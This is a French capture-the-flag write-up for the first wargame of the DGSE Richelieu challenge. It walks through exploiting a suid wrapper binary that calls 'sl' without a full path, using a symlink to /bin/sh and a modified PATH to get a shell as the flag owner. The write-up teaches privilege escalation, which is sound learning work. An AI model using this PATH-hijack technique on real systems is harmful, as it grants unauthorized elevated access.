# Challenge Richelieu DGSE - Wargame #1

Nous y voilà : le wargame. il s'agit de réaliser une élévation de privilège ou du moins à la simuler en passant d'un utilisateur A à un utilisateur B, via un binaire ayant des droits [suid](https://fr.wikipedia.org/wiki/Setuid#Setuid_et_Setgid_pour_les_ex%C3%A9cutables)

Le programme précédemment "cracké" nous as donné la possibilité de nous connecter sur un serveur ssh. Il y a juste dessus un  [binaire](./binaries/defi1.bin) et un fichier texte :

```bash
defi1@AttrapeLeDrapeau:~$ ls -l
total 16
-r-------- 1 defi1-drapeau defi1-drapeau  133 Apr 26 14:06 drapeau.txt
-r-sr-sr-x 1 defi1-drapeau defi1-drapeau 8752 May 10 10:50 prog.bin
```

Notez les "s" à la place des classiques "x" sur la ligne correspondant au binaire *prog.bin*. Cela indique que le binaire est en *suid*: toute l’exécution de ce programme sera faite en tant qu'utilisateur *defi1-drapeau*. Notez aussi que le fichier drapeau n'est lisible que par l'utilisateur *defi1-drapeau* et que l'on est connecté en tant qu'utilisateur *defi1*

Lançons le programme :
```bash
#################################################
##    Bienvenue dans ce lanceur (_wrapper_)    ##
#################################################
Ce logiciel vous permet de lancer ces programmes utiles simplement...
Menu :
   -> 1 : Affichage de la date et de l\'heure actuelle
   -> 2 : Affichage du nombre de secondes écoulées depuis le 01/01/1970 (Epoch)
   -> 3 : Affichage du train
   -> 4 : Affichage du calendrier du mois en cours
1
Nous sommes le 07/06/2019 et il est 20:15:37
```
Sans déboguer ni désassembler ce binaire, en testant toutes les commandes, on comprend que si l'ont tape 1, on lance la commande `date '+Nous sommes le %d/%m/%Y et il est %H:%M:%S'`. Si l'on tape 2, on lance `date '+Nombre de secondes depuis Epoch : %s'`. Si l'ont tapes 3 on lance `sl`. Et `cal` si l'on tape 4.

Les commandes sont lancées sans indiquer le chemin complet. Le système va se baser sur la variable d'environnement *PATH* pour savoir où chercher l’exécutable à lancer. C'est là que se situe la faille, car on peut modifier cette variable d'environnement.

On lance donc les commandes suivantes :

```bash
ln -sf /bin/sh sl
ls -l sl
lrwxrwxrwx 1 defi1 defi1 7 Jun  7 20:23 sl -> /bin/sh
PATH="$(pwd):$PATH" ./prog.bin
```
Si on envoie "3" au programme, il va lancer system("sl"), qui va récupérer dans la variable *PATH* les dossiers dans lesquels chercher l’exécutable "sl". Le premier sera le répertoire courant. Il va le trouver : il s'agit d'un lien symbolique vers /bin/sh. C'est donc cette commande qui sera exécutée. On obtient un shell en tant qu'utilisateur effectif *defi1-drapeau*. Il ne nous reste plus qu'à afficher le contenu du drapeau : `cat drapeau.txt`. Il y est indiqué comment se connecter au deuxième défi.

Le premier binaire est disponible [ici](./binaries/defi1.bin), si vous voulez vous faire la main.

La suite en cliquant sur le lien suivant : [Wargame #2](./Wargame2.md)
